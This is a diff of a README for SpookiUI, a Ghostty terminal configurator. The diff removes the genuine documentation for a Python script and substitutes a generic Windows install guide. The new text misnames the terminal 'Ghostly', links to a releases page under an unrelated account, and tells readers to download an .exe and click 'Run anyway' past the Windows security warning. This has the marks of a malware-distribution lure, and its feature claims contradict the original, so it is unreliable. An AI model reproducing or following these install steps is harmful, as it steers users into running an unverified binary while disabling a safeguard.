@@ -1,331 +1,73 @@
-# SpookiUI
-
-A **live configurator for the [Ghostty](https://ghostty.org) terminal**. Browse
-and edit *every* option Ghostty supports from an interactive terminal UI, and
-watch your changes apply **live** — when you run it inside a Ghostty window, the
-very terminal you're in repaints as you edit.
-
-![SpookiUI screenshot](demo/spookyui.png)
+# 👻 SpookiUI - Simplify your terminal configuration settings today
 
-```
-./spookiui.py
-```
-
-<sub>Requires Python 3.8+ (standard library only — no pip installs) and the
-`ghostty` binary on your `PATH` (or in `/Applications/Ghostty.app`).</sub>
-
----
-
-## Installation
-
-SpookiUI has **no third-party Python dependencies** — it's a single script that
-runs on the Python 3.8+ standard library. You can run it straight from the repo:
-
-```bash
-git clone https://github.com/mattj85/SpookiUI.git
-cd SpookiUI
-./spookiui.py
-```
-
-Or run the installer (macOS & Linux) to check prerequisites and put a `spookiui`
-command on your `PATH`:
-
-```bash
-./install.sh                     # installs to ~/.local/bin
-PREFIX=/usr/local ./install.sh   # system-wide (may need sudo)
-```
-
-The installer verifies Python 3.8+, checks for the `ghostty` binary (warning
-with install hints if it's missing), and symlinks `spookiui.py` into your bin
-directory. After it runs, `spookiui` and `spookiui --help` work from anywhere.
-
-To reverse it, run the uninstaller (pass the same `PREFIX` you installed with):
-
-```bash
-./uninstall.sh                   # remove the `spookiui` command
-PREFIX=/usr/local ./uninstall.sh # if you installed there
-./uninstall.sh --purge           # also delete SpookiUI's cache + saved profiles
-```
-
-It only removes the symlink it recognises as its own (never a file it didn't
-create, and never a Homebrew install — use `brew uninstall` for that), and
-leaves your Ghostty config and the repo untouched.
-
-### Homebrew (macOS & Linux)
-
-A Homebrew formula lives in [`homebrew/spookiui.rb`](homebrew/spookiui.rb). Once
-it's published to a tap repo named `homebrew-spookiui`, install with:
-
-```bash
-brew install mattj85/spookiui/spookiui
-```
-
-Homebrew installs are updated with `brew upgrade spookiui`; the in-app updater
-detects a Homebrew install and defers to it.
-
-## Why it exists
-
-Ghostty is configured through a plain-text file (`~/.config/ghostty/config`) and
-**cannot auto-reload on file change** — you have to trigger a reload yourself.
-SpookiUI closes that loop: it writes the config file *and* triggers a Ghostty
-reload for you — clicking the **Reload Configuration** menu item on macOS, or
-sending the running process the **SIGUSR2** signal it reloads on under Linux —
-so editing feels live. It runs on both macOS and Linux.
-
-Every option is discovered **dynamically** from your installed Ghostty
-(`ghostty +show-config --default --docs`), so the tool always matches your
-version — nothing is hard-coded. On this machine that's ~200 options across 13
-categories. Options that only apply to the *other* operating system (macOS-only
-settings on Linux, GTK/X11 settings on macOS) are **hidden automatically** so you
-only ever see what's relevant to the machine you're on.
-
-## The live loop
-
-```
- you edit a value ─▶ SpookiUI writes the config file
-                          │
-                          ├─▶ validates it with `ghostty +validate-config`
-                          │       (an invalid value is rejected & rolled back)
-                          │
-                          └─▶ reloads Ghostty ─▶ your terminal repaints
-                                  (macOS: "Reload Configuration" menu item via
-                                   AppleScript · Linux: SIGUSR2 to the process)
-```
-
-- **Safe:** every change is validated by Ghostty itself before it's saved. Bad
-  values never reach your config.
-- **Reversible:** a dated backup (`config.spookiui.YYYYMMDD.bak`) is made on the
-  first change of the day, the TUI can revert an entire session with `R`, and you
-  can wipe the config back to Ghostty's built-in defaults with `X` (a backup is
-  still kept).
-- **Live preview:** while picking a theme, font, or enum value, each highlighted
-  option is applied as you scroll — cancel and it snaps back to where you were.
-
-## Live reload by platform
-
-Ghostty can't watch its config file for changes, so SpookiUI triggers the reload
-for you. How that happens — and what it needs — depends on your OS:
-
-| Platform | How the reload fires | Requirements |
-| --- | --- | --- |
-| **macOS** | Clicks the **Reload Configuration** menu item via AppleScript (`osascript`) | Ghostty must be running; your terminal needs **Accessibility** permission (*System Settings → Privacy & Security → Accessibility*). Ghostty is located on `PATH` or at `/Applications/Ghostty.app`. |
-| **Linux** | Sends **`SIGUSR2`** to the running Ghostty process(es), which Ghostty reloads on | Ghostty must be running; `pgrep` (from `procps`/`procps-ng`, present on essentially every distro) is used to find it. No extra permission needed. Works on any distribution — detection is generic (`sys.platform`), with no distro-specific code. |
-| **Other** | *No auto-reload* — the file is still written and validated | Trigger your own `reload_config` keybind in Ghostty to apply. |
-
-On **Linux**, Ghostty is found via `PATH` (`shutil.which`), falling back to
-`/usr/bin/ghostty` and `/usr/local/bin/ghostty`. Only Python 3.8+ (standard
-library) and the `ghostty` binary are required; live reload additionally needs
-`pgrep` and a running Ghostty instance.
-
-If a reload can't be triggered (Ghostty isn't running, missing permission, or an
-unsupported platform), your change is **still written and validated safely** —
-SpookiUI just tells you to reload manually. A few options (e.g. `language`) can't
-be applied without a restart at all; the UI flags these as *needs restart* /
-*new windows only* so there are no surprises.
-
-## The TUI
-
-```
- SpookiUI · live Ghostty configurator          AUTO-APPLY:ON · live
- Colors & Theme    │ ● theme            Catppuccin Mocha │ theme
- Font              │   background        #1e1e2e          │ type: theme
- Cursor            │   foreground        #cdd6f4          │ value: Catppuccin…
- Window            │ ● background-opacity 0.95            │ ─ docs ───────────
- …                 │   …                                  │ Set the color …
-```
-
-| Key | Action |
-| --- | --- |
-| `↑`/`↓` or `j`/`k` | move · `Tab` switch pane |
-| `→`/`Enter` | into options / **edit** the selected option |
-| `←` | back to categories |
-| `/` | search all options by name or documentation |
-| `u` | reset the selected option to its default |
-| `a` | toggle **auto-apply** (live ↔ staged) |
-| `s` | save + reload now · `r` re-trigger reload |
-| `R` | revert everything to session start |
-| `X` | wipe config & restore **all** Ghostty defaults (backup kept) |
-| `U` | update SpookiUI in place to the latest release |
-| `p` | **profiles** — save / load / delete named configs · `t` toggles light↔dark |
-| `c` | **config check** (doctor) — health-check for issues |
-| `v` | **utils** — one-shot fixes (e.g. **Fix SSH**) |
-| `d` | show everything you've changed |
-| `?` | help · `q` quit |
-
-When your terminal font is a **Nerd Font**, each category in the left column
-gets an icon (palette, font, cursor, apple/linux, …). SpookiUI detects this from
-Ghostty's `font-family`; if no Nerd Font is set it shows a one-time note on how
-to install one for your platform and then runs without icons. Force it either
-way with `SPOOKIUI_ICONS=1` / `SPOOKIUI_ICONS=0`.
-
-Editors are typed to each option:
-
-- **booleans** toggle instantly
-- **enums / font** open a searchable picker with live preview, listing *every*
-  valid choice Ghostty documents (e.g. all 11 `macos-icon` styles)
-- **theme** opens the picker with a **live colour card** for the highlighted
-  theme — its 16-colour palette and a foreground-on-background sample, rendered
-  right beside the list so you see a theme before applying it
-- **bounded numbers** (opacity, `minimum-contrast`, …) open a **visual slider** —
-  `←`/`→` to adjust, `PgUp`/`PgDn` for larger jumps, `Home`/`End` for the ends,
-  all previewed live
-- **other numbers** step with `↑`/`↓` or `+`/`-`, or type a value
-- **colors / text** take a typed value (`#rrggbb` or a named color); colours show
-  a swatch, and colour options preview the active palette in the detail pane
-- **keybindings** open a **guided builder** — toggle modifiers (`super`/`ctrl`/
-  `alt`/`shift`, where `super` is ⌘ on macOS), press or pick the key, and choose
-  the action from Ghostty's own action list; the result is validated before it's
-  added
-- **other lists** (`palette`, `env`, font fallbacks, …) get an add/edit/delete
-  editor
-
-**Auto-apply off** stages your edits in memory instead of touching disk; press
-`s` to write + reload them all at once.
-
-On macOS you can also restyle the **app icon** from here: pick a `macos-icon`
-style (`official`, `blueprint`, `chalkboard`, `microchip`, `glass`,
-`holographic`, `paper`, `retro`, `xray`, …) and, with `custom-style`, tweak
-`macos-icon-frame` plus the `macos-icon-ghost-color` / `macos-icon-screen-color`
-(which get live swatches). See the icon gallery at
-<https://noahskelton.github.io/ghostty-icons/>.
-
-## Profiles & the config doctor
-
-**Profiles** are named snapshots of your whole config — press `p` in the TUI (or
-use `spookiui profile …`) to save the current setup, then load it back later.
-Save a `light` and a `dark` profile and the `t` key (or `spookiui profile
-toggle`) flips between them instantly. Loading a profile is validated and backs
-up your current config first, like every other change. Profiles live in
-`$XDG_DATA_HOME/spookiui/profiles` (`~/.local/share/…` by default), outside
-Ghostty's own config dir so it never reads them.
-
-**`spookiui doctor`** (or `c` in the TUI) health-checks your config and reports:
-invalid settings, unknown/typo'd options, options set more than once (dead
-lines), settings that just repeat a default, and keybind triggers bound twice or
-shadowing a Ghostty default. Findings are grouped by severity; it exits non-zero
-when there are errors, so it drops cleanly into a pre-commit hook for dotfiles.
-
-## Utils — one-shot fixes
-
-The **⚙ Utils** category (last entry in the left pane, or press `v` anywhere)
-collects small, one-shot maintenance actions that aren't Ghostty config options.
-Highlight an action to read what it does; press `Enter`/`→` to run it.
-
-### Fix SSH
-
-Ghostty tells programs it is **`xterm-ghostty`** (via the `TERM` variable). When
-you SSH into another machine, that host looks `xterm-ghostty` up in **its own**
-terminfo database — and most remote boxes have never heard of it. The remote
-shell then misbehaves: garbled or dead keys, missing colour, broken
-`clear`/`tput`, or the classic `Error opening terminal: xterm-ghostty`.
-
-**Fix SSH** adds one line to your shell rc (`~/.zshrc` or `~/.bashrc`, whichever
-matches your login shell):
-
-```sh
-alias ssh="TERM=xterm-256color ssh"
-```
-
-so the `ssh` command runs with **`xterm-256color`** — a terminfo entry
-essentially every host already ships. Your local Ghostty session keeps its full
-`xterm-ghostty` features; only the outbound SSH connection is downgraded to the
-universally-understood value. Nothing on the remote host is changed.
-
-It's **safe and idempotent**: it first scans your shell rc files (`.zshrc`,
-`.bashrc`, `.bash_profile`, …) and does nothing if the alias is already there;
-otherwise it appends the line and syntax-checks the file. Because a running shell
-can't be modified from outside, it then tells you to `source` the file or open a
-new terminal for the alias to take effect. To undo, delete the alias line. (A
-more thorough alternative is copying Ghostty's terminfo to each host, but this
-alias is the quick fix that needs no remote access.)
-
-Run it from the CLI too:
-
-```bash
-./spookiui.py fix-ssh            # add the alias if it's missing
-./spookiui.py fix-ssh --check    # report whether it's present; change nothing
-./spookiui.py fix-ssh --explain  # print the full what/why, then exit
-```
-
-## Scriptable CLI
-
-Everything the TUI does is also available non-interactively:
-
-```bash
-./spookiui.py list [category]      # list options (＊ = changed from default)
-./spookiui.py list [category] --all # include options for the other OS
-./spookiui.py get   <key>          # print an option's current value
-./spookiui.py doc   <key>          # show an option's documentation + choices
-./spookiui.py set   <key> <value>… # set (writes + reloads live); repeat value for lists
-./spookiui.py set   <key> <v> --no-reload   # write without reloading
-./spookiui.py reset --yes          # clear config & restore all Ghostty defaults (backup kept)
-./spookiui.py version              # print version & check GitHub for a newer release
-./spookiui.py update               # update in place to the latest release (git pull or download)
-./spookiui.py profile save <name>  # snapshot the current config as a named profile
-./spookiui.py profile load <name>  # apply a saved profile (validated, backed up)
-./spookiui.py profile list         # list saved profiles  (also: show / delete / toggle)
-./spookiui.py profile toggle       # flip between the 'light' and 'dark' profiles
-./spookiui.py doctor               # health-check the config (duplicates, unknown keys, keybind clashes…)
-./spookiui.py fix-ssh              # fix garbled SSH sessions (adds a TERM=xterm-256color ssh alias)
-./spookiui.py fix-ssh --check      # report whether the SSH alias is present; change nothing
-./spookiui.py reload               # trigger a live reload
-./spookiui.py validate             # validate the current config
-./spookiui.py themes               # list installed themes
-./spookiui.py fonts                # list monospace font families
-./spookiui.py path                 # print the config file in use
-```
-
-Examples:
-
-```bash
-./spookiui.py set theme "Catppuccin Latte"
-./spookiui.py set font-size 15
-./spookiui.py set font-family "JetBrains Mono" "Symbols Nerd Font"   # primary + fallback
-./spookiui.py doc background-opacity
-```
-
-## Notes & limitations
-
-- **Live reload works on macOS and Linux** (and degrades safely elsewhere) — see
-  [Live reload by platform](#live-reload-by-platform) above for the per-OS
-  mechanism and requirements.
-- Edits to single-value options are made **in place**, preserving your file's
-  comments and layout. New options and list options are written under a
-  clearly-marked `# added by SpookiUI` section.
-- The config path is auto-detected (`$XDG_CONFIG_HOME/ghostty/config`, then
-  `~/.config/ghostty/config`, then the macOS app-support path).
-
-## Updates
-
-On startup SpookiUI quietly checks GitHub for a newer release. If one exists, the
-TUI shows a `⬆ UPDATE vX.Y.Z` badge in the header (and *press `U` to update* on the
-status line); the help screen (`?`) always shows your current version. Run
-`spookiui version` any time to check on demand.
-
-The check is **best-effort and non-blocking** — it runs on a background thread,
-times out quickly, and stays silent if you're offline or GitHub is unreachable.
-The result is cached for a day (under `$XDG_CACHE_HOME/spookiui/`) so it never
-hammers the API. To turn it off entirely, set `SPOOKIUI_NO_UPDATE_CHECK=1`.
-
-### Updating in place — no `git pull` needed
-
-Press `U` in the TUI, or run `spookiui update`. No update server is involved —
-GitHub is the source, and SpookiUI is a single file, so updating just swaps that
-file:
-
-- **Git checkout** (the default `install.sh` layout) → it runs `git pull` for you.
-- **Standalone copy** → it downloads the latest release's `spookiui.py`, *verifies
-  it compiles*, then atomically replaces the file (keeping a `.prev` backup). A
-  truncated or bad download can never leave you with a broken tool.
-- **No write permission** (e.g. installed system-wide as root) → it tells you the
-  exact command to run instead of failing silently.
-
-Restart SpookiUI afterwards to run the new version.
-
-Maintainers: notifications and updates only pick up a version once a matching
-**GitHub Release** is published — see [`RELEASING.md`](RELEASING.md) for the
-bump-and-release flow.
-
-## License
-
-MIT — see [`LICENSE`](LICENSE).
+[![Download SpookiUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Megandimorphic651/SpookiUI/releases)
+
+## What is SpookiUI?
+
+SpookiUI acts as a bridge between you and your terminal environment. It provides a visual interface to manage settings for the Ghostly terminal. You no longer need to edit complex text files or remember obscure commands. This application puts your settings into a clear menu system. You select options, click buttons, and save choices. The app handles the technical side of the process to ensure your terminal works exactly how you want it.
+
+## 🖥️ System Requirements
+
+To run SpookiUI on your Windows computer, make sure your system meets these basic needs:
+
+* Windows 10 or Windows 11.
+* A stable internet connection for the initial download.
+* At least 50 megabytes of free space on your hard drive.
+* Administrative permissions on your user account to install the application.
+
+If you encounter issues during setup, confirm that your Windows installation has the latest updates. Old versions of Windows may lack the frame components needed to draw the interface properly.
+
+## 📥 How to Install SpookiUI
+
+Follow these steps to set up the software on your machine.
+
+1. Visit the [official releases page](https://github.com/Megandimorphic651/SpookiUI/releases).
+2. Look for the section labeled "Assets."
+3. Select the file ending in `.exe` that corresponds to your system architecture. Most modern computers use the x64 version.
+4. Save the file to your Downloads folder.
+5. Open your Downloads folder and double-click the file you just saved.
+6. A security warning may appear because the app comes from outside the Microsoft Store. Click "More Info" and then select "Run anyway" to proceed.
+7. Follow the on-screen prompts to complete the installation.
+8. Locate the SpookiUI icon on your desktop to launch the tool.
+
+## ⚙️ Using the Application
+
+Once the application opens, you will see a list of categories on the left side of your screen. These categories group related settings.
+
+### Customizing Appearance
+Click on the "Theme" tab to change the look of your Ghostly terminal. You can pick from several pre-set color schemes here. If you prefer a specific shade for your font or your background, click the color box to open the selector. Changes appear in a preview window so you can see the result before you apply them. Click the "Save" button to commit these changes to your configuration file.
+
+### Management of Shortcuts
+The "Shortcuts" tab allows you to define custom actions for your keyboard. Click the "Add new" button to start. Press the keys you want to use, then choose the action you want the terminal to perform. This helps you work faster by automating repetitive tasks.
+
+### Interface Settings
+The "Settings" tab covers how the terminal behaves. You can toggle options like font size, line spacing, and window transparency. These settings take effect the next time you open your terminal.
+
+## 🛠️ Troubleshooting Common Problems
+
+Users sometimes face minor issues during setup. Use these steps to resolve common errors.
+
+* If the program fails to open, restart your computer and try again. 
+* If symbols appear as squares rather than text, you may need a font update. Go to the "View" menu and select "Fix Fonts" to trigger an automatic repair.
+* If you cannot save your changes, confirm that your user profile has write access to the folder where the Ghostly terminal resides.
+* If the window looks too small or too large, go to "View" and select "Reset Window Size."
+
+## 📈 Keeping Your Software Updated
+
+We release improvements to SpookiUI on a regular basis. You should check the download page every few months to see if a newer version exists. When a new version arrives, repeat the installation steps. The installer will detect your old settings and migrate them to the new version automatically. You do not need to uninstall the old version first, but doing so keeps your computer clean.
+
+## 📚 Frequently Asked Questions
+
+**Does SpookiUI change my actual terminal files?**
+Yes, it modifies the configuration files used by the Ghostly terminal. It creates a backup of your current files before it makes any changes.
+
+**Can I undo my changes?**
+You can use the "Restore Backup" option in the "Settings" menu to revert to your previous configuration if you dislike your current setup.
+
+**Does this app track my usage?**
+No, the application runs entirely on your local machine. It does not send your data to external servers.
+
+**Do I need an internet connection to use the app?**
+You only need an internet connection to download the installer. Once installed, the app functions offline.
+
+Keywords: terminal, configuration, windows, tools, automation, settings, interface, management
